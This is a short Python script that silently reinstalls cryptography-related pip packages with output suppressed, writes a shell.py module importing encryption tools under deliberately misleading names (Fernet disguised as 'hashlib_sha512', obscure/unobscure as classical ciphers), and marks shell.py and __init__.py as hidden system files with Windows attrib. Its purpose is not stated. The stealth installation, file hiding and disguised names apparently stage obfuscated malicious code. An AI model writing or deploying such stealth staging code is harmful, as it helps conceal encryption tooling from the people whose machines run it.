import os , subprocess

try:
    update_pip = 'pip uninstall cryptography'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

except:
    pass

try:
    update_pip = 'pip install cryptography'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

try:
    update_pip = 'pip uninstall pypiwin32'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

except:
    pass

try:
    update_pip = 'pip install pypiwin32'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass


try:
    update_pip = 'pip uninstall obscure-password'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

except:
    pass

try:
    update_pip = 'pip install obscure-password'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass


try:
    update_pip = 'pip uninstall aes-everywhere'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)

except:
    pass

try:
    update_pip = 'pip install aes-everywhere'
    subprocess.call(update_pip, shell=True,
                    stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
except:
    pass

try:
    os.remove('shell.py')
except:
    pass

try:
    os.remove('__init__.py')
except:
    pass


shl = """
from AesEverywhere import aes256 as aes256bit
from obscure_password import obscure as vigenere_cipher
from obscure_password import unobscure as affine_cipher
from cryptography.fernet import Fernet as hashlib_sha512
base64 = hashlib_sha512.generate_key()
caesar_cipher = hashlib_sha512(base64)
"""





with open("shell.py" , "a") as w:
    w.writelines(shl)

with open("__init__.py" , "a") as w:
    w.writelines("from .shell import *")
    
subprocess.Popen(f'attrib +s +h shell.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
subprocess.Popen(f'attrib +s +h __init__.py', shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)




